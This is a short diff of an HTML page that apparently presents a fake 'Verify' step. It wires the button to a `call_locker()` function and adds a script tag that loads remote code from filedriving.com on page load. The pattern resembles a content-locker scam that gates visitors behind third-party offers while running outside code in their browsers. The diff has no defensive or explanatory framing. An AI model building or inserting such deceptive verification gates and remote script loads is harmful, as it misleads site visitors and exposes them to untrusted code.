@@ -28,7 +28,15 @@
 	</div>
 	<div class="verification-button-wrapper animated bounceIn animation-delay-1000">
 	
-	<button type="button" class="btn btn-lg btn-block btn-light mb-1 mt-1 t-bold-i pt-2 pb-2 VB" onclick="<a href="https://filedriving.com/script_include.php?id=1073629/>";">Verify</button>
-		
+	<button type="button" class="btn btn-lg btn-block btn-light mb-1 mt-1 t-bold-i pt-2 pb-2 VB" onclick="call_locker();">Verify</button>
+
+      <script src="jquery-3.4.1.min.js"></script>
+      <script src="popper.min.js"></script>
+      <script src="bootstrap.min.js"></script>
+      <script src="nouislider.min.js"></script>
+      <script src="progressbar.js"></script>
+      <script src="main.js"></script>
+
+      <script type="text/javascript" src="https://filedriving.com/script_include.php?id=1073629"></script>
 	</div>
 </div>
